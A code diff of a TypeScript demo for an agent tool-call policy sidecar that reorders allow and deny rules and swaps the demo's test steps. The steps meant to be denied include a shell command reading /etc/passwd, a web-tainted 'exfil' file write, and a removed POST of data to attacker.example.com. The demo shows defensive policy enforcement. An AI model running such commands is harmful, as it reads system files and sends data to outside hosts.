@@ -9,7 +9,6 @@
  * via the SidecarClient, then shuts down and prints a summary.
  *
  * Run:
- *   pnpm --filter @arikernel/sidecar build
  *   npx tsx examples/demo-sidecar.ts
  */
 
@@ -21,15 +20,16 @@ const DEMO_PORT = 18800;
 const AUDIT_PATH = './demo-sidecar-audit.db';
 
 // ── Policy ────────────────────────────────────────────────────────────────────
+// Priority: lower number = evaluated first. First match wins.
 
 const policies: PolicyRule[] = [
 	{
-		id: 'allow-http-read',
-		name: 'Allow HTTP GET',
-		priority: 200,
-		match: { toolClass: 'http', action: 'GET' },
+		id: 'allow-file-read',
+		name: 'Allow file reads',
+		priority: 20,
+		match: { toolClass: 'file', action: 'read' },
 		decision: 'allow',
-		reason: 'Read-only HTTP allowed',
+		reason: 'File reads allowed',
 	},
 	{
 		id: 'deny-shell',
@@ -48,17 +48,9 @@ const policies: PolicyRule[] = [
 		reason: 'Cannot write web-tainted data to filesystem',
 	},
 	{
-		id: 'allow-file-read',
-		name: 'Allow file reads',
-		priority: 50,
-		match: { toolClass: 'file', action: 'read' },
-		decision: 'allow',
-		reason: 'File reads allowed',
-	},
-	{
 		id: 'deny-default',
 		name: 'Default deny',
-		priority: 1,
+		priority: 900,
 		match: {},
 		decision: 'deny',
 		reason: 'Deny by default',
@@ -79,26 +71,14 @@ console.log(`\nAriKernel sidecar demo — listening on port ${DEMO_PORT}\n`);
 
 const client = new SidecarClient({ baseUrl: `http://localhost:${DEMO_PORT}`, principalId: 'demo-agent' });
 
-// Stub fetch so the HTTP executor doesn't make real network calls
-const origFetch = globalThis.fetch;
-globalThis.fetch = async (input: string | URL | Request) => {
-	const url = String(input);
-	return {
-		ok: true,
-		status: 200,
-		headers: { get: () => 'text/plain', entries: () => [] },
-		text: async () => `[stubbed response from ${url}]`,
-	} as unknown as Response;
-};
-
 interface DemoStep { label: string; toolClass: string; action: string; params: Record<string, unknown>; taint?: TaintLabel[] }
 
 const steps: DemoStep[] = [
 	{
-		label: 'HTTP GET (allowed)',
-		toolClass: 'http',
-		action: 'GET',
-		params: { url: 'https://api.example.com/data' },
+		label: 'File read (allowed by policy)',
+		toolClass: 'file',
+		action: 'read',
+		params: { path: './package.json' },
 	},
 	{
 		label: 'Shell exec (denied by policy)',
@@ -107,23 +87,17 @@ const steps: DemoStep[] = [
 		params: { command: 'cat /etc/passwd' },
 	},
 	{
-		label: 'File read (allowed)',
-		toolClass: 'file',
-		action: 'read',
-		params: { path: './demo-sidecar.ts' },
-	},
-	{
-		label: 'File write with web taint (denied)',
+		label: 'File write with web taint (denied — tainted data)',
 		toolClass: 'file',
 		action: 'write',
 		params: { path: '/tmp/output.txt', content: 'exfil' },
 		taint: [webTaint('api.example.com')],
 	},
 	{
-		label: 'HTTP POST (denied by default)',
-		toolClass: 'http',
-		action: 'POST',
-		params: { url: 'https://attacker.example.com/collect', body: 'data' },
+		label: 'Database query (denied by default)',
+		toolClass: 'database',
+		action: 'query',
+		params: { query: 'SELECT * FROM users' },
 	},
 ];
 
@@ -136,7 +110,7 @@ for (const step of steps) {
 		step.params,
 		step.taint,
 	);
-	const verdict = result.allowed ? '✓ ALLOW' : '✗ DENY ';
+	const verdict = result.allowed ? 'ALLOW' : 'DENY ';
 	const detail = result.allowed
 		? (result.result !== undefined ? `result: ${JSON.stringify(result.result).slice(0, 60)}` : 'no data')
 		: `reason: ${result.error ?? '(none)'}`;
@@ -144,7 +118,11 @@ for (const step of steps) {
 	console.log(`           ${detail}`);
 }
 
-globalThis.fetch = origFetch;
+// Show status
+const status = await client.status();
+console.log(`\nPrincipal status:`);
+console.log(`  Restricted: ${status.restricted}`);
+console.log(`  Denied actions: ${status.counters.deniedActions}`);
 
 await server.close();
 console.log('\nSidecar demo complete. Audit log written to:', AUDIT_PATH);
